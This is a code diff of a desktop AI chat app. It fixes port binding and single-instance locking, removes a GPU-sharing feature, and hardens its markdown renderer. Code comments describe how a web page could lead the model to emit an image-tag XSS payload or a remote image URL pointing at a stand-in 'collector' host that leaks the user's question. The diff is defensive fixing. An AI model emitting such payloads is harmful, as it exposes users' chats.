-    server = socketserver.ThreadingTCPServer(
-        ("127.0.0.1", PORT), StudioHandler, bind_and_activate=False
-    )
-    server.allow_reuse_address = True
-    server.daemon_threads = True
-    server.server_bind()
-    server.server_activate()
-    server.serve_forever()
+# Where the app goes when 8889 is taken: far from the engines, whose
+# catalog ports climb by two from 8884 (8944 today, and the next row
+# takes the next even port), from 9889 and from ConcordeGo's 9897. The
+# gauntlet fails if a catalog or retired port ever lands in here.
+FALLBACK_PORTS = tuple(range(18890, 18899))
+
+
+def bind_backend():
+    """Bind the app's server BEFORE any window opens, and say which port
+    it got (6b310). This used to bind on a background thread while the
+    window opened http://127.0.0.1:8889 regardless. On a Mac with two
+    logins, when the other person's ConcordeAI already held 8889, only
+    that thread died, and this window loaded THEIR app: their chats,
+    memory and keys. Now a taken port moves the desktop app to a
+    fallback (dev and test instances named their port and fail
+    instead), and the window opens the port actually bound."""
+    global PORT
+    last = None
+    for p in (PORT,) + (FALLBACK_PORTS if DEFAULT_APP else ()):
+        srv = socketserver.ThreadingTCPServer(
+            ("127.0.0.1", p), StudioHandler, bind_and_activate=False)
+        srv.daemon_threads = True
+        if IS_WIN:
+            # Windows' SO_REUSEADDR lets a second process bind a port
+            # that is already listening; exclusive use forbids it
+            srv.allow_reuse_address = False
+            try:
+                srv.socket.setsockopt(socket.SOL_SOCKET,
+                                      socket.SO_EXCLUSIVEADDRUSE, 1)
+            except (AttributeError, OSError):
+                pass
+        else:
+            srv.allow_reuse_address = True
+        try:
+            srv.server_bind()
+            srv.server_activate()
+        except OSError as exc:
+            srv.server_close()
+            last = exc
+            continue
+        PORT = p
+        return srv
+    raise last or OSError("no port to listen on")
+
+
+_INSTANCE_LOCK = []
+INSTANCE_NOTE = os.path.join(app_dir(), "run", "instance.json")
+
+
+def single_instance(wait: float = 15.0) -> bool:
+    """One desktop app per OS user (6b310). A second copy on a fallback
+    port would write the same chats.json as the first, and the last
+    whole-list save wins. True = this process holds the lock and runs.
+    False = another copy runs: it was asked to bring its window forward,
+    or the person was told it's open. A copy that is quitting (the swap
+    after an update) answers nothing, so the new one waits for its lock."""
+    path = os.path.join(app_dir(), "run", "instance.lock")
+    try:
+        os.makedirs(os.path.dirname(path), exist_ok=True)
+        os.chmod(os.path.dirname(path), 0o700)
+        f = open(path, "a+")
+    except OSError:
+        return True          # can't lock, can't police: don't block launch
+
+    def _try_lock():
+        try:
+            if IS_WIN:
+                import msvcrt
+                f.seek(0)
+                msvcrt.locking(f.fileno(), msvcrt.LK_NBLCK, 1)
+            else:
+                import fcntl
+                fcntl.flock(f.fileno(), fcntl.LOCK_EX | fcntl.LOCK_NB)
+            _INSTANCE_LOCK.append(f)     # held open for the process's life
+            return True
+        except OSError:
+            return False
+
+    if _try_lock():
+        return True
+    if _hand_off():
+        f.close()
+        return False
+    deadline = time.time() + wait
+    while time.time() < deadline:
+        time.sleep(0.5)
+        if _try_lock():
+            return True
+    f.close()
+    _already_open_notice()
+    return False
+
+
+def _write_instance_note():
+    """Where this copy's window lives, for a second launch to find
+    (0600, in this user's own data folder: the key opens the app)."""
+    try:
+        fd = os.open(INSTANCE_NOTE, os.O_WRONLY | os.O_CREAT | os.O_TRUNC,
+                     0o600)
+        with os.fdopen(fd, "w") as fh:
+            json.dump({"port": PORT, "key": ACCESS_KEY}, fh)
+    except OSError:
+        pass
+
+    def _drop():
+        try:
+            with open(INSTANCE_NOTE) as fh:
+                if json.load(fh).get("key") == ACCESS_KEY:
+                    os.remove(INSTANCE_NOTE)
+        except (OSError, ValueError):
+            pass
+    atexit.register(_drop)
+
+
+def _hand_off() -> bool:
+    """Ask the running copy to come forward. True when it answered."""
+    try:
+        with open(INSTANCE_NOTE) as fh:
+            d = json.load(fh)
+        port, key = int(d["port"]), str(d["key"])
+        req = urllib.request.Request(
+            "http://127.0.0.1:%d/api/window/focus" % port, data=b"{}",
+            headers={"Content-Type": "application/json",
+                     "Cookie": "millen_key_%d=%s" % (port, key)})
+        with urllib.request.urlopen(req, timeout=3) as r:
+            return r.status == 200
+    except Exception:
+        return False
+
+
+def _already_open_notice():
+    msg = "%s is already open. Use its window." % APP_NAME
+    print("\n  " + msg + "\n")
+    try:
+        if IS_MAC:
+            subprocess.run(["osascript", "-e",
+                            'display dialog "%s" buttons {"OK"} '
+                            'default button 1 with title "%s"'
+                            % (msg, APP_NAME)], timeout=60)
+        elif IS_WIN:
+            import ctypes
+            ctypes.windll.user32.MessageBoxW(None, msg, APP_NAME, 0x40)
+    except Exception:
+        pass
+
+
+def start_backend(server=None):
+    (server or bind_backend()).serve_forever()
 
 
 HTML_CONTENT = r"""<!DOCTYPE html>
@@ -17058,26 +16923,8 @@ body.gen #chip-model{color:var(--accent)}
 #dlhelp-card button{flex:1;padding:11px 14px;border-radius:10px;
   border:none;background:var(--accent);color:#1a1a1a;font-weight:700;
   font-size:13.5px;cursor:pointer}
-#share-veil{position:fixed;inset:0;z-index:60;display:flex;
-  align-items:center;justify-content:center;background:rgba(6,7,10,.72);
-  -webkit-backdrop-filter:blur(8px);backdrop-filter:blur(8px)}
-#share-veil[hidden]{display:none}
-#share-card{max-width:420px;margin:24px;padding:26px 26px 20px;
-  background:var(--panel);border:1px solid var(--line);
-  border-radius:var(--radius);text-align:center;
-  animation:doorPop .5s cubic-bezier(.16,1,.3,1) both}
 @keyframes doorPop{from{opacity:0;transform:translateY(18px) scale(.97)}
                    to{opacity:1;transform:none}}
-#share-card .sh-icon{font-size:34px;margin-bottom:6px}
-#share-card h2{margin:0 0 8px;font-size:21px}
-#share-card p{color:var(--dim);font-size:13.5px;line-height:1.6;margin:0}
-#share-card .sh-foot{display:flex;gap:10px;margin-top:20px}
-#share-card button{flex:1;padding:11px 14px;border-radius:10px;
-  border:1px solid var(--line);background:none;color:var(--dim);
-  font-size:13.5px;cursor:pointer}
-#share-card button.primary{background:var(--accent);color:#1a1a1a;
-  border:none;font-weight:700}
-#share-card button:hover{color:var(--text)}
 #new-veil,#update-veil,#about-veil{
   position:fixed;inset:0;z-index:60;background:rgba(0,0,0,.66);
   backdrop-filter:blur(6px);-webkit-backdrop-filter:blur(6px);
@@ -17213,22 +17060,6 @@ body.gen #chip-model{color:var(--accent)}
 .fscope{display:flex;gap:6px;align-items:center;font-size:12px;
   color:var(--text)}
 #forget-note{font-size:11px;color:var(--faint);min-height:14px}
-/* Community: the ledger + the three promises */
-#contrib-stats{display:grid;grid-template-columns:repeat(3,1fr);gap:8px;
-  margin:10px 0 12px;padding:0}
-#contrib-stats div{background:var(--panel);border:1px solid var(--line);
-  border-radius:9px;padding:8px 10px;margin:0}
-#contrib-stats dt{font-family:var(--mono);font-size:8.5px;
-  letter-spacing:.12em;text-transform:uppercase;color:var(--faint)}
-#contrib-stats dd{margin:2px 0 0;font-family:var(--mono);font-size:14px;
-  font-variant-numeric:tabular-nums}
-#lend-head{font-size:12px;color:var(--text);margin:4px 0 6px}
-#contrib-seg{display:flex;border:1px solid var(--line);border-radius:9px;
-  overflow:hidden;margin-bottom:10px;font-family:var(--mono);
-  font-size:10.5px}
-.cseg{flex:1;text-align:center;padding:6px 0;color:var(--faint);
-  cursor:pointer;user-select:none}
-.cseg.on{background:var(--text);color:#111;font-weight:600}
 /* Models: the roster */
 #roster{font-family:var(--mono);font-size:10.8px;line-height:1.9;
   font-variant-numeric:tabular-nums;margin-bottom:4px}
@@ -17492,27 +17323,27 @@ body.gen #chip-model{color:var(--accent)}
 #turbo-row{display:flex;gap:8px;align-items:flex-start;font-size:11.5px;
   color:var(--dim);margin:12px 2px 2px;cursor:pointer;line-height:1.5;
   text-align:left}
-#turbo-row input,#contrib-row input,#nolimits-row input,#share-row input,#beta-row input,
+#turbo-row input,#nolimits-row input,#beta-row input,
 #giants-row input{
   appearance:none;-webkit-appearance:none;
   width:17px;height:17px;flex:none;margin:0;border-radius:5px;
   border:1.5px solid var(--faint);background:rgba(255,255,255,.04);
   cursor:pointer;position:relative;transition:all .15s;
 }
-#turbo-row input:hover,#contrib-row input:hover,#nolimits-row input:hover,
-#share-row input:hover,#beta-row input:hover,#giants-row:not(.off) input:hover{
+#turbo-row input:hover,#nolimits-row input:hover,
+#beta-row input:hover,#giants-row:not(.off) input:hover{
   border-color:var(--accent-hot)}
-#turbo-row input:checked,#contrib-row input:checked,
-#nolimits-row input:checked,#share-row input:checked,#beta-row input:checked,
+#turbo-row input:checked,
+#nolimits-row input:checked,#beta-row input:checked,
 #giants-row input:checked{
   background:var(--accent);border-color:var(--accent)}
-#turbo-row input:checked::after,#contrib-row input:checked::after,
-#nolimits-row input:checked::after,#share-row input:checked::after,
+#turbo-row input:checked::after,
+#nolimits-row input:checked::after,
 #beta-row input:checked::after,#giants-row input:checked::after{
   content:"";position:absolute;left:5px;top:1.5px;
   width:4px;height:9px;border:solid #14161c;
   border-width:0 2.2px 2.2px 0;transform:rotate(45deg)}
-#turbo-row,#contrib-row,#nolimits-row,#share-row,#beta-row{
+#turbo-row,#nolimits-row,#beta-row{
   display:flex;align-items:center;gap:10px;font-size:13px;
   color:var(--text);padding:8px 2px;cursor:pointer;line-height:1.4}
 /* 6b241, per Patrick: beta opt-in is a preference, not a headline — it
@@ -17529,7 +17360,6 @@ body.gen #chip-model{color:var(--accent)}
   text-decoration:underline;text-underline-offset:3px;
   text-align:center;width:100%}
 #about-forget.about-btn.danger:hover{color:#e8907e;border:none}
-#share-row[hidden]{display:none}
 #turbo-row[hidden]{display:none}
 .hint{
   font-style:normal;width:15px;height:15px;flex:none;cursor:help;
@@ -17539,15 +17369,6 @@ body.gen #chip-model{color:var(--accent)}
 }
 .hint:hover{color:var(--text);border-color:var(--dim)}
 
-#fleet-box{margin:10px 2px 4px;margin:14px 0 4px;text-align:left}
-#contrib-state{font-family:var(--mono);font-size:10px;color:var(--faint);
-  font-style:italic;
-  margin:4px 0 6px;min-height:12px}
-#fleet-pending .preq{display:flex;align-items:center;gap:8px;
-  font-size:12.5px;color:var(--text);margin-bottom:6px}
-#fleet-pending .preq button{margin-left:auto;padding:5px 12px;
-  border-radius:8px;border:none;background:var(--accent);color:#1a1a1a;
-  font-weight:600;cursor:pointer}
 /* response length (6b231): slim rail, full width, and the same
    mono micro-header type as every other label in this window. The
    earlier attempt silently no-op'd — its anchor never matched, so
@@ -17576,18 +17397,6 @@ body.gen #chip-model{color:var(--accent)}
 #adv-grid{display:flex;flex-direction:column;gap:5px;margin-top:0}
 #adv-grid .about-btn{width:100%;text-align:left;padding:7px 12px;
   font-size:12.5px;margin-top:0}
-#fleet-adv{margin-top:6px}
-#fleet-adv summary{font-family:var(--mono);font-size:9.5px;
-  color:var(--faint);cursor:pointer;letter-spacing:.1em}
-/* text fields only (6b257): the bare `#fleet-box input` rule stretched
-   the new AC/idle CHECKBOXES to full width and gave them a panel
-   background — a duplicate-declaration collision of the classic kind */
-#fleet-box input:not([type=checkbox]){
-  width:100%;box-sizing:border-box;margin-bottom:6px;padding:8px 10px;
-  background:var(--panel2);border:1px solid var(--line);border-radius:8px;
-  color:var(--text);font-size:12.5px;outline:none;
-}
-#fleet-box input:not([type=checkbox]):focus{border-color:var(--accent-dim)}
 #autoclean-bar{display:flex;align-items:center;gap:10px;
   justify-content:space-between;margin-top:12px;flex-wrap:nowrap}
 #autoclean-bar #autoclean-toggle{flex:1;min-width:0;color:var(--text)}
@@ -17599,9 +17408,6 @@ body.gen #chip-model{color:var(--accent)}
   display:inline-block;width:auto}
 #autoclean-bar #clean-now[hidden]{display:none}
 #autoclean-note{font-size:11.5px;color:var(--faint)}
-#acon-row,#idleon-row{display:flex;gap:7px;align-items:center;
-  font-size:12px;color:var(--text);margin:6px 0}
-#acon-row input,#idleon-row input{flex:none;margin:0}
 /* #about-facts carries no rule of its own anymore (6b245): it is a row
    of the #set-spec list and inherits its type like every sibling — the
    old 11.5px bold + margin made MODELS the loudest line in the box */
@@ -18255,10 +18061,6 @@ __CODE_ROWS__
       <div class="meter-label"><span>__MEM_LABEL__</span></div>
       <div class="meter" id="mem-meter"></div>
     </div>
-    <div class="meter-row">
-      <div class="meter-label"><span>COMMUNITY GPU</span></div>
-      <div class="meter" id="fleet-meter"></div>
-    </div>
   </div>
 </aside>
 
@@ -18431,7 +18233,6 @@ __CODE_ROWS__
         <button class="snav" data-pane="p-account">Account</button>
         <button class="snav" data-pane="p-persona">Personality</button>
         <button class="snav" data-pane="p-cloud">Cloud power</button>
-        <button class="snav" data-pane="p-community">Community</button>
         <button class="snav" data-pane="p-models">Models</button>
       </div>
     </nav>
@@ -18514,8 +18315,10 @@ __CODE_ROWS__
     <section class="spane" id="p-cloud">
       <div class="set-h">Cloud power</div>
       <p class="tdesc">Optional frontier brains. Add a key and cloud
-      drafts blend into your answers; your prompts leave this machine
-      only while a key is on.</p>
+      drafts blend into your answers. Your chats reach a cloud provider
+      only while a key is on. A question that needs the web goes, as
+      typed, to a search engine; weather and place questions send the
+      place name to weather and map services.</p>
       <label id="turbo-row" hidden><input type="checkbox" id="turbo">
         <span>Use cloud power</span><i class="hint" id="turbo-hint"
         title="Answers come from a cloud GPU instead of this Mac — much faster, but your prompts leave this computer while it is on.">i</i></label>
@@ -18533,36 +18336,6 @@ __CODE_ROWS__
         </div>
         <div id="ck-note"></div>
         <div id="ck-models"></div>
-      </div>
-    </section>
-    <section class="spane" id="p-community">
-      <div class="set-h">Community</div>
-      <p class="tdesc">Lend this Mac's idle GPU to friends running
-      MillenAI, on your terms &mdash; and see what your machine has
-      given back.</p>
-      <label id="contrib-row"><input type="checkbox" id="contrib">
-        <span>Contribute GPU power</span><i class="hint" id="contrib-hint"
-        title="By default it only answers while this Mac is idle and plugged in — and friends' machines answer yours. Tune or turn it off below.">i</i></label>
-      <div id="fleet-box">
-        <dl id="contrib-stats">
-          <div><dt>answered</dt><dd id="cs-jobs">&mdash;</dd></div>
-          <div><dt>time given</dt><dd id="cs-time">&mdash;</dd></div>
-          <div><dt>generated</dt><dd id="cs-chars">&mdash;</dd></div>
-        </dl>
-        <div id="lend-head">How much of this Mac to lend<i class="hint"
-          title="A time share of idle capacity — at 50% it rests as long as it works. A share of TIME, not a GPU throttle: no honest GPU-percent knob exists.">i</i></div>
-        <div id="contrib-seg">
-          <span class="cseg" data-pct="25">25%</span>
-          <span class="cseg" data-pct="50">50%</span>
-          <span class="cseg" data-pct="75">75%</span>
-          <span class="cseg" data-pct="100">100%</span>
-        </div>
-        <label id="acon-row"><input type="checkbox" id="acon">
-          <span>Only while plugged in</span></label>
-        <label id="idleon-row"><input type="checkbox" id="idleon">
-          <span>Only while this Mac is idle</span></label>
-        <div id="fleet-pending"></div>
-        <div id="contrib-state"></div>
       </div>
     </section>
     <section class="spane" id="p-models">
@@ -18661,20 +18434,6 @@ __CODE_ROWS__
   </div>
 </div>
 
-<div id="share-veil" hidden>
-  <div id="share-card">
-    <div class="sh-icon">&#9889;</div>
-    <h2>Share your GPU?</h2>
-    <p>When your machine is idle, it can answer questions for friends on
-       MillenAI — and theirs can answer yours. Nothing leaves your computer
-       unless you turn this on, and you can stop any time in Settings.</p>
-    <div class="sh-foot">
-      <button id="share-no">Not now</button>
-      <button id="share-yes" class="primary">&#9889; Share GPU power</button>
-    </div>
-  </div>
-</div>
-
 <!-- FIRST-RUN WIZARD (6b247, per Patrick): four guided steps over the
      app — welcome, local brains, cloud power, go. Shows once
      (prefs.wizard_done); the old setup veil stays for updates and the
@@ -18766,9 +18525,6 @@ __CODE_ROWS__
     <label id="giants-row" class="giants-row off"><input type="checkbox"
       id="giants" disabled><span>Include 128 GB+ models</span><i
       class="hint" title="Massive models: each one needs at least 512 GB of memory to run, and downloads about 400 GB.">i</i></label>
-    <label id="share-row"><input type="checkbox" id="share-first">
-      &#9889; Share GPU power — when idle, your machine helps answer the
-      community&rsquo;s questions (off any time in Settings)</label>
     <div id="setup-note"></div>
     <div id="setup-foot">
       <button id="setup-later">Later</button>
@@ -19378,7 +19134,12 @@ function riskCard(t){
 /* ------------------------------------------------- remote agent (6b249) */
 // The autonomy throttle: Manual / Auto / Full, stored and sent with the
 // request. The server's classifier decides which commands actually pause.
+// kept in prefs too (6b310): browser storage is per port, and a moved
+// app would quietly fall back to Auto from a chosen Manual
 let autonomy=localStorage.getItem("millen.autonomy")||"auto";
+fetch("/api/prefs").then(r=>r.json()).then(p=>{
+  if(["manual","auto","full"].includes(p.remote_autonomy)){
+    autonomy=p.remote_autonomy;paintAutonomy();}}).catch(()=>{});
 function paintAutonomy(){
   $$("#autonomy-seg .autoseg").forEach(el=>
     el.classList.toggle("on",el.dataset.a===autonomy));
@@ -19386,6 +19147,8 @@ function paintAutonomy(){
 $$("#autonomy-seg .autoseg").forEach(el=>
   el.addEventListener("click",()=>{
     autonomy=el.dataset.a;localStorage.setItem("millen.autonomy",autonomy);
+    fetch("/api/prefs",{method:"POST",headers:{"Content-Type":"application/json"},
+      body:JSON.stringify({remote_autonomy:autonomy})}).catch(()=>{});
     paintAutonomy();
   }));
 paintAutonomy();
@@ -19465,7 +19228,13 @@ modeShow("ai");
 // each hardware-class group inside is its own dropdown, folded by default —
 // open one tier of the ladder at a time instead of a wall of models
 /* ------------------------------------------------------ markdown-lite */
-function esc(s){return s.replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;");}
+// QUOTES TOO (6b310). Escaping only & < > let an answer's text close an
+// attribute: renderMD builds <img alt="..."> and <a href="..."> from the
+// markdown, so ![x" onerror="...](https://...) ran script in this page,
+// which can read every chat. A web page can talk a model into writing
+// exactly that line.
+function esc(s){return String(s).replace(/&/g,"&amp;").replace(/</g,"&lt;")
+  .replace(/>/g,"&gt;").replace(/"/g,"&quot;").replace(/'/g,"&#39;");}
 /* mini-highlighter (6.0b206): four token classes, good enough to make
    code read as CODE — comments, strings, keywords, numbers. Input is
    already HTML-escaped. */
@@ -19475,8 +19244,11 @@ const HL_KW=new Set(("def return if else elif for while import from as with try 
  +"switch case do fn pub struct impl match mut use mod echo fi then esac done local sudo").split(" "));
 function hilite(code,lang){
   return code.replace(
-    /(&quot;.*?&quot;|&#39;.*?&#39;|`[^`]*`)|((?:^|\s)(?:#|\/\/)[^\n]*)|\b(\d+(?:\.\d+)?)\b|\b([A-Za-z_][A-Za-z0-9_]*)\b/gm,
-    (m,str,com,num,word)=>{
+    // an entity passes whole: a lone apostrophe is &#39;, and the number
+    // rule must not wrap its 39 in a span (6b310)
+    /(&quot;.*?&quot;|&#39;.*?&#39;|`[^`]*`)|((?:^|\s)(?:#|\/\/)[^\n]*)|(&(?:#\d+|[a-z]+);)|\b(\d+(?:\.\d+)?)\b|\b([A-Za-z_][A-Za-z0-9_]*)\b/gm,
+    (m,str,com,ent,num,word)=>{
+      if(ent)return m;
       if(str)return '<i class="hstr">'+str+"</i>";
       if(com)return '<i class="hcom">'+com+"</i>";
       if(num)return '<i class="hnum">'+num+"</i>";
@@ -19523,8 +19295,11 @@ function flowDiagram(src){
   });
   const rows=layers.map(names=>
     '<div class="frow">'+names.map(n=>
-      '<div class="fnode" data-n="'+esc(n)+'"><b>'+esc(n)+"</b>"
-      +(nodes.get(n).note?"<span>"+esc(nodes.get(n).note)+"</span>":"")
+      // the text is escaped already (renderMD escaped the whole answer);
+      // a second esc() showed &#39; literally once quotes were escaped.
+      // The attribute keeps it: the browser decodes an attribute once.
+      '<div class="fnode" data-n="'+esc(n)+'"><b>'+n+"</b>"
+      +(nodes.get(n).note?"<span>"+nodes.get(n).note+"</span>":"")
       +"</div>").join("")+"</div>").join("");
   // arrows are drawn AFTER layout by wireFlow (needs real positions)
   // URI-encoded: esc() leaves double quotes alone, which truncated the
@@ -19665,6 +19440,14 @@ function dlBox(d){
     +'<path d="M12 4v11"/><path d="M6.5 10.5L12 16l5.5-5.5"/>'
     +'<path d="M5 19h14"/></svg></a></div>';
 }
+// A navigation to the file made pywebview re-fetch it on its own session,
+// without the launch cookie, and save the 403 text as the file (6b310).
+// A link with a download attribute stays inside the page's session.
+function dlDirect(a){
+  const t=document.createElement("a");
+  t.href=a.getAttribute("href");t.download=a.getAttribute("download")||"";
+  document.body.appendChild(t);t.click();t.remove();
+}
 // the desktop app cannot save through WKWebView, so put the file in front
 // of the user the native way instead: reveal it in Finder.
 document.addEventListener("click",async e=>{
@@ -19677,8 +19460,8 @@ document.addEventListener("click",async e=>{
       headers:{"Content-Type":"application/json"},
       body:JSON.stringify({id:box.dataset.id})})).json();
     box.classList.toggle("done",!!(r&&r.ok));
-    if(!(r&&r.ok))window.location.href=a.getAttribute("href");
-  }catch(e2){window.location.href=a.getAttribute("href");}
+    if(!(r&&r.ok))dlDirect(a);
+  }catch(e2){dlDirect(a);}
   if(was)box.setAttribute("data-said",was);
 });
 function renderMD(raw){
@@ -19694,13 +19477,15 @@ function renderMD(raw){
   // filename or the JSON, and restored next to the THINK restores below
   const dls=[];
   s=s.replace(/\[\[dl:(\{.*?\})\]\]/g,(_,j)=>{
-    try{dls.push(JSON.parse(j.replace(/&quot;/g,'"').replace(/&amp;/g,"&")));}
+    try{dls.push(JSON.parse(j.replace(/&quot;/g,'"').replace(/&#39;/g,"'")
+                             .replace(/&amp;/g,"&")));}
     catch(e){dls.push(null);}
     return "\u0000DL"+(dls.length-1)+"\u0000";});
   s=s.replace(/\[\[dl:[^\]]{0,400}\]?$/,"");   // a half-arrived token
   const vds=[];
   s=s.replace(/\[\[vid:(\{.*?\})\]\]/g,(_,j)=>{
-    try{vds.push(JSON.parse(j.replace(/&quot;/g,'"').replace(/&amp;/g,"&")));}
+    try{vds.push(JSON.parse(j.replace(/&quot;/g,'"').replace(/&#39;/g,"'")
+                             .replace(/&amp;/g,"&")));}
     catch(e){vds.push(null);}
     return "\u0000VD"+(vds.length-1)+"\u0000";});
   s=s.replace(/\[\[vid:[^\]]{0,400}\]?$/,"");
@@ -19745,9 +19530,15 @@ function renderMD(raw){
   s=s.replace(/^### (.*)$/gm,"<h3>$1</h3>").replace(/^## (.*)$/gm,"<h2>$1</h2>").replace(/^# (.*)$/gm,"<h1>$1</h1>");
   // markdown links — research briefs cite their sources this way. Only
   // http(s) is allowed through, so a model cannot emit javascript: or data:
-  // generated pictures (6b294): our own /api/image/ files or https only
-  s=s.replace(/!\[([^\]\n]*)\]\(((?:\/api\/image\/[\w.-]+)|https?:\/\/[^\s)]+)\)/g,
+  // generated pictures (6b294): OUR OWN /api/image/ files only (6b310).
+  // A remote picture loads with no click, so an answer that a web page
+  // talked into ![](https://collector/?q=<your question>) sent the
+  // question out the moment it rendered. A remote one is a link now.
+  s=s.replace(/!\[([^\]\n]*)\]\((\/api\/image\/[\w.-]+)\)/g,
     (_,a,u)=>'<img class="genimg" src="'+u+'" alt="'+a+'" loading="lazy">');
+  s=s.replace(/!\[([^\]\n]*)\]\((https?:\/\/[^\s)]+)\)/g,
+    (_,a,u)=>'<a href="'+u+'" target="_blank" rel="noopener noreferrer">'
+      +(a||"image")+"</a>");
   s=s.replace(/\[([^\]\n]+)\]\((https?:\/\/[^\s)]+)\)/g,
     (_,t,u)=>'<a href="'+u+'" target="_blank" rel="noopener noreferrer">'+t+"</a>");
   // PIPE TABLES — models reach for them constantly and they used to
@@ -19961,18 +19752,22 @@ async function mountPlaces(id,places,loc,mapd){
 // the Fable treatment: real photos from the pages the answer read,
 // and a live pinned map when the answer is about a place
 function photoRow(ph){
-  if(!ph||!ph.length)return "";
+  // https only, here too: older chats saved http photos (6b310)
+  ph=(ph||[]).filter(u=>/^https:\/\//.test(String(u)));
+  if(!ph.length)return "";
   return '<div class="photorow">'+ph.map(u=>
     '<img src="'+esc(u)+'" loading="lazy" referrerpolicy="no-referrer" '
     +'onerror="this.remove()" alt="">').join("")+'</div>';
 }
 function mapCard(m){
-  if(!m||typeof m.lat!=="number")return "";
-  const d=0.004,bb=(m.lon-d)+","+(m.lat-d)+","+(m.lon+d)+","+(m.lat+d);
+  // numbers only (6b310): lon went into the src unchecked
+  const la=m?+m.lat:NaN,lo=m?+m.lon:NaN;
+  if(!isFinite(la)||!isFinite(lo))return "";
+  const d=0.004,bb=(lo-d)+","+(la-d)+","+(lo+d)+","+(la+d);
   return '<div class="mapcard"><iframe loading="lazy" src='
     +'"https://www.openstreetmap.org/export/embed.html?bbox='+bb
-    +'&layer=mapnik&marker='+m.lat+','+m.lon+'"></iframe>'
-    +'<a href="https://maps.apple.com/?ll='+m.lat+','+m.lon
+    +'&layer=mapnik&marker='+la+','+lo+'"></iframe>'
+    +'<a href="https://maps.apple.com/?ll='+la+','+lo
     +'&q='+encodeURIComponent((m.name||"").split(",")[0]||"pin")
     +'" target="_blank" rel="noopener">Open in Maps \u2197</a></div>';
 }
@@ -20450,7 +20245,6 @@ async function send(){
   abortCtl=new AbortController();
   let full="",t0=performance.now(),tokEst=0,lastRate=0,wasAborted=false,searched=false,status=null,drafts=[],sources=null,photos=null,mapd=null,locCtx="",places=null,placeHint=null;
   const seenStatus=[];
-  const lastStatusWas=s=>seenStatus.some(x=>x.indexOf(s)>=0);
   lastModels="";
 
   try{
@@ -20689,9 +20483,8 @@ async function send(){
   }
   if(full&&!isErr){
     const meta=document.createElement("div");meta.className="meta";
-    const where=/cloud|gemini|groq|claude|gpt|openai|community/i
-      .test(lastModels)?"cloud":(lastStatusWas("GPU is on it")
-      ?"a friend\u2019s GPU":"this Mac");
+    const where=/cloud|gemini|groq|claude|gpt|openai/i
+      .test(lastModels)?"cloud":"this Mac";
     meta.innerHTML='<span class="wbadge">'+esc(where)+'</span>'
       +"<b>"+lastRate.toFixed(1)+" tok/s</b> · ~"+Math.round(tokEst)
       +" tokens · "+secs.toFixed(1)+"s";
@@ -20958,8 +20751,12 @@ let chatSaveTimer=null;
 async function loadChatsFromDisk(){
   try{
     const server=(await(await fetch("/api/chats")).json()).chats||[];
-    if(server.length){chats=server;}
-    else if(chats.length){await pushChatsToDisk();}   // migrate old localStorage
+    // the server's list is the truth, empty included (6b310). This used
+    // to post the browser's copy back when the server had none, which
+    // brought chats erased with Forget back to life, and the copy is
+    // kept per port, so a moved app found an old one.
+    chats=server;
+    if(!server.length){try{localStorage.removeItem("millen.chats");}catch(e){}}
     renderChats();
   }catch(e){}
 }
@@ -21432,7 +21229,7 @@ function renderChats(){
   const rest=mine.filter(c=>!c.pin);
   const row=c=>
     '<div class="chat-item'+(c.id===curChat?" active":"")
-    +(c.pin?" pinned":"")+'" data-id="'+c.id+'">'
+    +(c.pin?" pinned":"")+'" data-id="'+esc(c.id)+'">'
     +'<span class="ct" title="'+esc(c.title||"chat")+'">'
     +esc(c.title||"chat")+'</span>'
     +'<span class="cpin" title="'+(c.pin?"Unpin":"Pin to top")+'">'
@@ -21603,7 +21400,7 @@ async function fnStep(){
     +'<div class="fsq">'+esc(d.q)+'</div>'
     +'<div class="fopts">'+(d.options||[]).map((o,i)=>
       '<button class="fopt" data-i="'+i+'">'
-      +(o.img?'<img src="'+esc(o.img)+'" alt="" loading="lazy">':"")
+      +(/^https:\/\//.test(o.img||"")?'<img src="'+esc(o.img)+'" alt="" loading="lazy">':"")
       +'<b>'+esc(o.label)+'</b>'
       +(o.why?'<span>'+esc(o.why)+'</span>':"")
       +'</button>').join("")+'</div></div>';
@@ -21772,7 +21569,7 @@ document.addEventListener("keydown",e=>{
     if(generating&&abortCtl){e.preventDefault();abortCtl.abort();return;}
     // close whatever modal is open, outermost last
     for(const sel of ["#new-veil","#update-veil","#about-veil",
-                      "#setup-veil","#share-veil"]){
+                      "#setup-veil"]){
       const el=$(sel);
       if(el&&!el.hidden){el.hidden=true;return;}
     }
@@ -21810,20 +21607,18 @@ $("#newchat").addEventListener("click",()=>{
 function buildMeter(el){const f=document.createElement("div");
   f.className="mfill";el.appendChild(f);}
 buildMeter($("#gpu-meter"));buildMeter($("#mem-meter"));
-buildMeter($("#fleet-meter"));
 function paintMeter(el,pct){
   const f=el.firstChild;if(!f)return;
   f.style.width=Math.max(0,Math.min(100,pct))+"%";
   f.classList.toggle("hot",pct>=80);
 }
-let simGpu=12,fleetStat=null,memPct=null;
+let simGpu=12,memPct=null;
 async function pollStats(){
   let gpu;
   try{
     const st=await(await fetch("/api/stats")).json();
     gpu=st.gpu_pct;
     memPct=(st.mem_pressure!=null?st.mem_pressure:st.mem_pct);
-    fleetStat={online:st.fleet_online||0,busy:st.fleet_busy||0};
   }catch(e){}
   if(gpu==null){
     // ambient fallback — clearly approximate
@@ -21839,13 +21634,6 @@ async function pollStats(){
      if(row)row.hidden=false;
      paintMeter($("#mem-meter"),memPct);
    }}
-  // COMMUNITY GPU: each friend online lights a quarter of the bar;
-  // it burns hot while any of them is actually working
-  const fm=$("#fleet-meter");
-  if(fm&&fm.firstChild&&fleetStat){
-    fm.firstChild.style.width=Math.min(100,(fleetStat.online||0)*25)+"%";
-    fm.firstChild.classList.toggle("hot",(fleetStat.busy||0)>0);
-  }
 }
 // polling is owned by applyStatsPolling (paused only while hidden)
 // (statsTimer is declared with the rest of the state — re-declaring it here
@@ -22855,13 +22643,6 @@ function openSetup(){
 function closeSetup(){veil.hidden=true;if(setupTimer){clearInterval(setupTimer);setupTimer=null;}input.focus();}
 setupLater.addEventListener("click",closeSetup);
 setupGo.addEventListener("click",async()=>{
-  const sh=$("#share-first");
-  if(sh&&sh.checked){
-    fetch("/api/prefs",{method:"POST",
-      headers:{"Content-Type":"application/json"},
-      body:JSON.stringify({contrib_on:true,seen_share:true})});
-    sh.closest("#share-row").hidden=true;
-  }
   if(setupAllReady){closeSetup();return;}
   await fetch("/api/setup/install",{method:"POST",
     headers:{"Content-Type":"application/json"},
@@ -22875,42 +22656,6 @@ $("#open-setup").addEventListener("click",()=>{aboutVeil.hidden=true;openSetup()
 {const mu=$("#models-up");
  if(mu){mu.addEventListener("click",openSetup);
